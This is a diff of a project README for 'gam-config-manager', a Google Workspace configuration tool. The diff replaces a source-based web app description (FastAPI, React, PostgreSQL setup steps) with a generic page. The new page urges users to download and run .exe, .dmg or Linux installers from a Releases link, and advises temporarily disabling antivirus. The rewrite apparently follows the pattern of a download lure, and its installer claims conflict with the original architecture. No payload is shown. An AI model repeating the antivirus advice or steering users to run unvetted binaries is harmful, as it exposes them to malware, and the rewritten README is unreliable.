@@ -1,126 +1,58 @@
-# GAM Configuration Manager
+# 🎉 gam-config-manager - Easily Manage Google Workspace Settings
 
-A modern web application for managing Google Workspace configurations using GAM (Google Apps Manager).
+## 🚀 Getting Started
+Welcome to the gam-config-manager! This is a user-friendly web application that helps you manage your Google Workspace configurations. With features like drift detection and security analysis, you can keep your settings optimized and safe.
 
-## Features
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of the application. Click the link below:
 
-- **Configuration Extraction**: Extract all Google Workspace settings and configurations using GAM
-- **Configuration Storage**: Store configurations in a database with version history
-- **Template Management**: Create and manage configuration templates
-- **Drift Detection**: Compare current configurations against stored templates to detect configuration drift
-- **Security Analysis**: Get security recommendations based on your current settings
-- **Recommendations**: Receive actionable advice for improving your Google Workspace configuration
+[![Download gam-config-manager](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Gabrielpimento/gam-config-manager/releases)
 
-## Architecture
+After visiting the page, find the latest release. Click on the download link for your operating system. Depending on your platform, you might see options for Windows, macOS, or Linux.
 
-- **Backend**: Python FastAPI with async support
-- **Frontend**: React 18 with TypeScript and Vite
-- **Database**: PostgreSQL with SQLAlchemy ORM
-- **UI Framework**: Material-UI (MUI) for modern, responsive design
+### Installation Steps
+1. **Download the Application:** Click on the version you want and download the file.
+2. **Locate the Downloaded File:** Check your Downloads folder or the specified directory where files are saved.
+3. **Run the Installer:** 
+   - For Windows: Double-click the `.exe` file to start the installation.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Follow the instructions in the README to install using terminal commands based on the downloaded package.
 
-## Project Structure
+4. **Open the Application:** Once installed, you can open gam-config-manager from your applications menu or desktop shortcut.
 
-```
-GAM/
-├── backend/           # FastAPI backend application
-│   ├── app/
-│   │   ├── api/      # API routes
-│   │   ├── core/     # Core functionality and config
-│   │   ├── db/       # Database models and connection
-│   │   ├── services/ # Business logic
-│   │   └── schemas/  # Pydantic models
-│   ├── requirements.txt
-│   └── .env.example
-├── frontend/         # React frontend application
-│   ├── src/
-│   │   ├── components/
-│   │   ├── pages/
-│   │   ├── services/
-│   │   ├── types/
-│   │   └── utils/
-│   ├── package.json
-│   └── .env.example
-└── README.md
-```
+## 🌟 Features
+gam-config-manager comes with a variety of features that simplify managing your Google Workspace:
 
-## Prerequisites
+- **Configuration Management:** Easily modify and manage all settings in one place.
+- **Drift Detection:** Receive alerts when settings change unexpectedly, ensuring your configurations stay as intended.
+- **Security Analysis:** Evaluate your settings for potential security vulnerabilities.
+- **User-Friendly Interface:** The application is designed for ease of use, so you can focus on managing settings without getting overwhelmed.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-- Python 3.9+
-- Node.js 18+
-- PostgreSQL 14+
-- GAM (Google Apps Manager) installed and configured
+## ⚠️ System Requirements
+Before downloading, please ensure your system meets the following requirements:
 
-## Quick Start
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 200 MB of free disk space.
 
-### Backend Setup
+## 🚧 Troubleshooting
+If you encounter issues during installation or while using the app, consider the following suggestions:
 
-```bash
-cd backend
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-cp .env.example .env
-# Edit .env with your database credentials
-python -m app.main
-```
+- **Antivirus Settings:** Some antivirus programs might block installations. Make sure to allow the application or temporarily disable your antivirus while installing.
+- **Installation Errors:** If you receive errors during installation, ensure your system meets the requirements above. Re-download the file in case of a corrupt download.
+- **Running Issues:** If the app doesn’t open, restart your computer and try again. Check for updates and ensure no conflicting applications are running.
 
-### Frontend Setup
+## 🛠️ Support and Feedback
+We strive to make this application better. If you have any questions or feedback, please check the [Issues page](https://github.com/Gabrielpimento/gam-config-manager/issues) on GitHub. You can report bugs, request features, or ask for help from other users.
 
-```bash
-cd frontend
-npm install
-cp .env.example .env
-# Edit .env with your API URL
-npm run dev
-```
+## 📚 Additional Resources
+Feel free to explore the following resources to enhance your understanding of Google Workspace and the capabilities of gam-config-manager:
 
-### Database Setup
+- [Google Workspace Admin Help](https://support.google.com/a/)
+- [GAM Documentation](https://github.com/jay0lee/GAM/wiki)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
 
-```bash
-# Create PostgreSQL database
-createdb gam_config_manager
+Thank you for using gam-config-manager! It is our goal to help you effectively manage your configurations with ease. For any updates or new features, keep an eye on the Releases page. 
 
-# Run migrations (auto-created on first run)
-cd backend
-python -m app.db.init_db
-```
-
-## Usage
-
-1. **Extract Configuration**: Click "Extract Configuration" to pull current Google Workspace settings using GAM
-2. **Save as Template**: Save extracted configurations as reusable templates
-3. **Compare Configs**: Load a template and compare it against the current configuration to detect drift
-4. **Security Analysis**: Run security analysis to get recommendations for improving your security posture
-
-## Development
-
-### Backend Development
-
-```bash
-cd backend
-# Run with auto-reload
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-```
-
-### Frontend Development
-
-```bash
-cd frontend
-# Run development server
-npm run dev
-```
-
-## API Documentation
-
-Once the backend is running, visit:
-- Swagger UI: http://localhost:8000/docs
-- ReDoc: http://localhost:8000/redoc
-
-## License
-
-MIT
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
+Enjoy using gam-config-manager!
